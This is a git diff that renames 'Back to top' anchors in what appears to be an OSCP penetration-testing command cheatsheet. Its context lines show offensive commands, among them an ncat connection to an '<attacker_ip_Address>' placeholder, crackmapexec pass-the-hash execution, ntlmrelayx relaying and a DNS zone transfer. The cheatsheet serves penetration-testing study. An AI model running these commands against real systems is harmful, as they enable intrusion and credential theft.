@@ -75,7 +75,7 @@ cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ### Some Netcat (nc, nc.exe, ncat) commands 
 
@@ -112,7 +112,7 @@ ncat -v <attacker_ip_Address> 444 --ssl
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ### Wireshark Filters and pcap related
 
@@ -137,7 +137,7 @@ tcpdump tcp port 80 -w output.pcap -i eth0
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ### Basic AF git commands
 
@@ -183,7 +183,7 @@ git config --global color.ui auto
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ### Remote Desktop
 
@@ -196,7 +196,7 @@ rdesktop ip_address -k es -u user -p pass -d domain
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ### Transfer files to windows
 
@@ -222,7 +222,7 @@ NET USE f: \\ip_kali\nombre_deseado_share /PERSISTENT:YES
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ## Port Scanning
 
@@ -237,7 +237,7 @@ map -sS -sV -O -sC --min-rate 1000 -p25,80,110,135,139,143,445,587,5985,47001 -o
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ## Web Directory Scanning (and related)
 
@@ -262,7 +262,7 @@ go/bin/shortscan http://url
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ## DNS Enumeration
 
@@ -302,7 +302,7 @@ dig axfr  @<DNS_IP> <DOMAIN>
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ## Manually enumerate LDAP through Python console
 
@@ -336,7 +336,7 @@ More LDAP search filters available at [Jonlabelle Gist](https://gist.github.com/
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ## SMB Enumeration
 
@@ -383,7 +383,7 @@ crackmapexec smb 192.168.10.11 [-d Domain] -u Administrator -H <NTHASH> -x whoam
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ## RPC Enumeration
 
@@ -442,7 +442,7 @@ netsharegetinfo <share>
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ## Kerberos attacks
 
@@ -490,7 +490,7 @@ sudo python /usr/local/bin/ntlmrelayx.py --no-http-server -smb2support -t <targe
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 ## Hascat, John and HashCracking related
 
@@ -531,6 +531,6 @@ john --format=crypt hash.txt --wordlist:/your/wordlist/list.txt
 
 ```
 
-[Back to top](#oscp_command-cheatsheet)
+[Back to top](#index)
 
 
